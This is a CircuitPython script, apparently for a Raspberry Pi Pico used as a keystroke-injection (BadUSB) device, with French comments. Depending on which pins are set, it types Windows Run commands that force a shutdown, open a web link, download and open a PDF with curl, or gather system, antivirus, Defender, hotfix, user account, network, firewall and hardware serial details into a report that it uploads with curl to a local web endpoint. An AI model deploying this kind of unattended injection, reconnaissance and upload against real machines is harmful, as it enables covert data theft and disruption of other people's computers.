import asyncio
import board
import digitalio
import supervisor
import usb_hid
import time

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode  # Touches utilisees pour ouvrir Executer et valider.
from keyboard_layout_win_fr import KeyboardLayout  # Layout Windows FR (Neradoc).

supervisor.runtime.autoreload = False

# --- LED onboard ---
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

# Configure un GPIO en entree avec une resistance pull-down interne.
def init_input(pin):
    io = digitalio.DigitalInOut(pin)
    io.direction = digitalio.Direction.INPUT
    io.pull = digitalio.Pull.DOWN
    return io

# GPIO utilises comme declencheurs d'actions.
gp0 = init_input(board.GP0)
gp1 = init_input(board.GP1)
gp2 = init_input(board.GP2)
gp3 = init_input(board.GP3)
gp4 = init_input(board.GP4)

# Fait clignoter la LED tant que le script est en phase d'initialisation.
async def blink_task(stop_event, period=0.15):
    """Blink LED until stop_event is set."""
    while not stop_event.is_set():
        led.value = not led.value
        await asyncio.sleep(period)
    led.value = False

# Ouvre la boite Executer de Windows et lance une commande d'arret.
def shutdown(kbd, layout, time_shutdown=0):
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write("shutdown /s /t " + str(time_shutdown))
    kbd.send(Keycode.ENTER)
    time.sleep(0.3)
    kbd.send(Keycode.ENTER)

# Ouvre Microsoft Edge avec l'URL passee en parametre.
def launch_weblink(kbd, layout, url):
    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write("msedge " + str(url))
    kbd.send(Keycode.ENTER)
    time.sleep(1.0)

# Telecharge le PDF dans le dossier Downloads de l'utilisateur.
def pdf_download(kbd, layout):
    PDF_URL = "https://laprovidence-maths-6eme.jimdofree.com/app/download/5552179912/Chap+6+-+Ex1+-+Nommer+des+angles+-+CORRIGE.pdf?t=1572467357"
    NEW_PDF_FILENAME = "p.pdf"
    command = (
        'cmd /c cd /d %USERPROFILE%\\Downloads&&curl -L "'
        + PDF_URL
        + '" -o '
        + NEW_PDF_FILENAME
    )

    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write(command)
    kbd.send(Keycode.ENTER)
    time.sleep(1.0)

# Telecharge le PDF puis l'ouvre avec l'application PDF par defaut.
def pdf_download_and_open(kbd, layout):
    PDF_URL = "https://laprovidence-maths-6eme.jimdofree.com/app/download/5552179912/Chap+6+-+Ex1+-+Nommer+des+angles+-+CORRIGE.pdf?t=1572467357"
    NEW_PDF_FILENAME = "p.pdf"
    command = (
        'cmd /c cd /d %USERPROFILE%\\Downloads&&curl -L "'
        + PDF_URL
        + '" -o '
        + NEW_PDF_FILENAME
        + '&&start '
        + NEW_PDF_FILENAME
    )

    kbd.send(Keycode.GUI, Keycode.R)
    time.sleep(0.3)
    layout.write(command)
    kbd.send(Keycode.ENTER)
    time.sleep(1.0)


def import_data_on_website(kbd, layout):
    WEB_UPLOAD_URL = "http://127.0.0.1:5000/upload"
    REPORT_PATH = "%TEMP%\\rapport_demo.txt"

    def run_cmd(command, wait=1.0):
        kbd.send(Keycode.GUI, Keycode.R)
        time.sleep(0.3)
        layout.write("cmd /c " + command)
        kbd.send(Keycode.ENTER)
        time.sleep(wait)

    run_cmd("type nul > " + REPORT_PATH)
    run_cmd("(echo [SYSTEME]) >> " + REPORT_PATH)
    run_cmd(
        'systeminfo | findstr /C:"Nom de l" /C:"OS Name" /C:"OS Version" /C:"BIOS Version" /C:"Domain" /C:"Mémoire physique totale" >> '
        + REPORT_PATH,
        wait=6.0,
    )
    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [ANTIVIRUS]) >> " + REPORT_PATH)
    run_cmd('(powershell -NoProfile -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct") >> ' + REPORT_PATH, wait=1.0,)
    run_cmd('(powershell -NoProfile -Command "Get-MpComputerStatus") >> ' + REPORT_PATH, wait=1.0,)
    run_cmd('(powershell -NoProfile -Command "Get-MpPreference") >> ' + REPORT_PATH, wait=1.0,)
    
    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [MAJ]) >> " + REPORT_PATH)
    run_cmd('(powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20") >> ' + REPORT_PATH, wait=1.0,)
    
    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [UTILISATEURS LOCAUX]) >> " + REPORT_PATH)
    run_cmd("net user >> " + REPORT_PATH)



    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [CONFIGURATION RESEAU]) >> " + REPORT_PATH)
    run_cmd("ipconfig >> " + REPORT_PATH, wait=1.0)

    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [IP]) >> " + REPORT_PATH)
    run_cmd('(powershell -NoProfile -Command "Get-NetIPConfiguration") >> ' + REPORT_PATH, wait=2.0,)

    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [MAC]) >> " + REPORT_PATH)
    run_cmd('(getmac /v) >> ' + REPORT_PATH, wait=1.0,)

    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [DNS]) >> " + REPORT_PATH)
    run_cmd('(powershell -NoProfile -Command "Get-DnsClientServerAddress") >> ' + REPORT_PATH, wait=2.0,)

    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [FIREWALL]) >> " + REPORT_PATH)
    run_cmd('(powershell -NoProfile -Command "Get-NetFirewallProfile") >> ' + REPORT_PATH, wait=2.0,)
    

    run_cmd("(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [PARTITION ET VOLUMES]) >> " + REPORT_PATH)
    run_cmd("chcp 65001>nul&wmic logicaldisk get name,description,filesystem,size,freespace | more >> " + REPORT_PATH, wait=2.0)

    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [BIOS UEFI]) >> " + REPORT_PATH)
    run_cmd("chcp 65001>nul&wmic bios get manufacturer,name,version,serialnumber,releasedate | more >> " + REPORT_PATH, wait=2.0)

    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [CARTE MERE]) >> " + REPORT_PATH)
    run_cmd("chcp 65001>nul&wmic baseboard get product,manufacturer,version,serialnumber | more >> " + REPORT_PATH, wait=2.0)

    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [RAM]) >> " + REPORT_PATH)
    run_cmd("chcp 65001>nul&wmic memorychip get capacity,speed,manufacturer,partnumber | more >> " + REPORT_PATH, wait=2.0)
    run_cmd(
        'chcp 65001>nul&(powershell -NoProfile -Command "[Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)" >> '
        + REPORT_PATH,
        wait=2.0,
    )

    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [CPU]) >> " + REPORT_PATH)
    run_cmd("chcp 65001>nul&wmic cpu get name,numberofcores,numberoflogicalprocessors,maxclockspeed | more >> " + REPORT_PATH, wait=2.0)

    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [GPU]) >> " + REPORT_PATH)
    run_cmd("chcp 65001>nul&wmic path win32_VideoController get name,adapterram,driverversion | more >> " + REPORT_PATH, wait=2.0)

    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [STOCKAGE]) >> " + REPORT_PATH)
    run_cmd("chcp 65001>nul&wmic diskdrive get model,size,serialnumber,mediatype | more >> " + REPORT_PATH, wait=2.0)

    run_cmd("chcp 65001>nul&(echo.) >> " + REPORT_PATH)
    run_cmd("(echo [TASK]) >> " + REPORT_PATH)
    run_cmd("(tasklist /svc) >> " + REPORT_PATH, wait=2.0)

    run_cmd('curl -F "file=@' + REPORT_PATH + '" ' + WEB_UPLOAD_URL, wait=3.0)


# Attend l'initialisation USB, puis execute les actions associees aux GPIO actifs.
async def main():
   
    # Indicate mode with LED
    stop_blink = asyncio.Event()
    asyncio.create_task(blink_task(stop_blink, period=0.12))

    # Let USB settle
    await asyncio.sleep(2.0)

    kbd = Keyboard(usb_hid.devices, timeout=10)
    layout = KeyboardLayout(kbd)

    # Instant Shutdown on GP0
    if gp0.value:
        shutdown(kbd, layout)
    
    if gp1.value:
        launch_weblink(kbd, layout, "https://www.youtube.com/watch?v=xvFZjo5PgG0")
    
    if gp2.value:
        pdf_download(kbd, layout)

    if gp3.value:
        pdf_download_and_open(kbd, layout)

    if gp4.value:
        import_data_on_website(kbd, layout)
    
    await asyncio.sleep(0.6)

    # Stop blink
    stop_blink.set()
    await asyncio.sleep(5.0)

    # Idle
    while True:
        await asyncio.sleep(1)


asyncio.run(main())
